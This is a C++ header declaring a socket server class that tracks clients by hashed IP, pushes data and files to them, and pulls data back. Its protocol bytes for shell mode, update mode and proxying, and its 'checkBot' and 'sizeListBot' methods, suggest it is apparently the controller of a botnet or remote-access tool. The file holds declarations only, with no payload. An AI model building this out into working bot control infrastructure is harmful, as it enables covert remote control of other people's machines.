#ifndef SRV_SOCKET
#define SRV_SOCKET

#include <cstdint>
#ifdef _WIN32
#  include <winsock2.h>
#  include <ws2tcpip.h>

#  define WIN(exp) exp
#  define LINUX(exp)
#else
#  include <sys/socket.h>
#  include <sys/types.h>
#  include <arpa/inet.h>
#  include <netinet/in.h>
#  include <unistd.h>

#  define WIN(exp)
#  define LINUX(exp) exp
#endif

#include <vector>
#include <string>
#include <thread>

#include <functional>

#include "../../include/thread_pool/pool.h"
#include "../../include/crypto/sha256.h"

#define PROXY_MESSAGE     0xff
#define ESTABILISH_BYTE   0xfe
#define SHELL_MODE_BYTE   0xfd
#define UPDATE_MODE_BYTE  0xfc
#define KEEP_ALIVE_PING   0xfb
#define CLOUD_CLIENT_BYTE 0xee
#define PROXY_MODE_FAILED 0xef
#define IS_CONNECTED      0xed

namespace sys {
    enum class SocketStatus : uint8_t {
        up = 0,
        connected = 1,
        disconnected = 2,
        err_init_socket = 3,
        err_bind_socket = 4,
        err_connection_socket = 5
    };

    enum class SocketType : uint8_t {
        tcp_socket = 0xfe,
        udp_socket = 0xff
    };

    enum class ThreadMode : uint32_t {
        single_thread = 0xfffe,
        multi_thread  = 0xffff
    };

    struct ClientConnectionData {
        std::string CID;

        uint32_t   host;
        uint16_t   port;

        bool proxy_hint;
        bool  is_online;
    } __attribute__((packed));

    struct entryFPAR {
        std::string fname_in;
        uint32_t   blockSize;
    };

    class SocketServer {
    protected:
        struct Client;

        typedef SocketStatus                 status;
        typedef SocketType                     type;
        typedef ThreadMode                     mode;

        status _status;
        type     _type;
        mode     _mode;

        #ifdef _WIN32
            typedef SOCKET      Socket_t;
            typedef sockaddr_in SockIn_t;
            typedef int32_t    SockLen_t;
        #else
            typedef int32_t     Socket_t;
            typedef sockaddr_in SockIn_t;
            typedef socklen_t  SockLen_t;
        #endif

        Socket_t srv_socket;
        SockIn_t srv_header;

        uint16_t port;

        std::vector<Client>    listClient;
        std::vector<Client> HistoryClient;

        void updateClient();

    public:
        void keepAliveCID();

        SocketServer();
        SocketServer(const uint16_t);
        SocketServer(const SocketServer&);

        [[nodiscard]] Socket_t                     getServerSocket() const { return this->srv_socket; }
        [[nodiscard]] SockIn_t                     getServerHeader() const { return this->srv_header; }
        [[nodiscard]] uint32_t                             getHost() const { return 0x00000000;       }
        [[nodiscard]] uint16_t                             getPort() const { return this->port;       }
        [[nodiscard]] ThreadMode                     getThreadMode() const { return this->_mode;      }
        [[nodiscard]] SocketType                     getSocketType() const { return this->_type;      }
        [[nodiscard]] SocketStatus                 getSocketStatus() const { return this->_status;    }
        [[nodiscard]] std::vector<ClientConnectionData> getClients();
        [[nodiscard]] std::vector<ClientConnectionData> getHistory();
        [[nodiscard]] std::vector<std::string>              getCID();

        void setPort(const uint16_t server_port)          { this-> port = server_port; }
        void setType(const SocketType& socket_type)       { this->_type = socket_type; }
        void setThreadType(const ThreadMode& thread_mode) { this->_mode = thread_mode; }

        bool socketInit();
        bool socketListenConnection();
        bool connectBy(const std::string&);

        bool sendBy(const std::string&, const void *, uint32_t);
        bool sendBy(const std::string&, const std::vector<char>&);
        bool sendBy(const std::string&, const std::string&);

        bool sendByFile(const std::string&, const void *, uint32_t);
        bool sendByFile(const std::string&, const std::vector<char>&);
        bool sendByFile(const std::string&, const std::string&);

        bool getByFile(const std::string&, const void *, uint32_t);
        bool getByFile(const std::string&, const std::vector<char>&);
        bool getByFile(const std::string&, const std::string&);

        bool readClientData(const std::string&, std::string&);
        bool readClientData(const std::string&, std::vector<char>&);

        bool downloadData(const std::string&, const std::string&);
        bool downloadData(const std::string&, const std::vector<char>&);

        uint64_t sendAll(const void *, uint32_t);
        uint64_t sendAll(const std::vector<char>&);
        uint64_t sendAll(const std::string&);

        uint64_t sendAllFile(const std::string&);
        uint64_t sendAllFile(const std::vector<char>&);
        uint64_t sendAllFile(const void *, uint32_t);

        bool disconnectBy(const std::string&);
        bool disconnectAll();

        void removeClient(const std::string&);
        void removeAll();

        uint64_t checkBot();
        uint64_t sizeListBot();

        ~SocketServer();
    };

    struct SocketServer::Client {
    private:
        Socket_t   cli_socket;
        SockIn_t   cli_header;

        type            _type;

        std::vector<char>
                     cli_data;
        sha256        sha_imp;
        std::vector<char> CID;

        bool proxy_hint = false;
        bool cloud_hint = false;
        
    public:
        [[nodiscard]] std::vector<char>   getData() const { return this->cli_data;   }
        [[nodiscard]] Socket_t          getSocket() const { return this->cli_socket; }
        [[nodiscard]] SockIn_t          getHeader() const { return this->cli_header; }
        [[nodiscard]] uint16_t            getPort() const { return htons(this->cli_header.sin_port); }
        [[nodiscard]] uint32_t            getHost() const { return this->cli_header WIN(.sin_addr.S_un.S_addr)LINUX(.sin_addr.s_addr); }
        [[nodiscard]] std::vector<char>    getCID() const { return this->CID; }
        [[nodiscard]] bool           getProxyHint() const { return this->proxy_hint; }

        void setSocket(const Socket_t client) { this->cli_socket = client; }
        void setHeader(const SockIn_t client) { this->cli_header = client; }
        void setProxyHint() {
            this->proxy_hint = true;
        }

        void setCloudHint() {
            this->cloud_hint = true;
        }

        void setCID() {
            std::string hash = sha_imp.hash(inet_ntoa(cli_header.sin_addr), sha256::sha256_options::option_string_hash);

            for (const auto& symbol : hash)
                CID.push_back(symbol);
        }

        bool connectClient();
        bool disconnectClient();

        bool isConnected();

        bool sendClientData(void *, uint32_t);
        bool sendClientData(const std::vector<char>&);
        bool sendClientData(const std::string&);

        bool sendFileClient(const std::string&);
        bool sendFileClient(const std::vector<char>&);
        bool sendFileClient(const void *, uint32_t);

        bool getFileClient(const std::string&);
        bool getFileClient(const std::vector<char>&);
        bool getFileClient(const void *, uint32_t);

        bool readClientData(std::string&);
        bool readClientData(std::vector<char>&);
    };
}

#endif // SRV_SOCKET
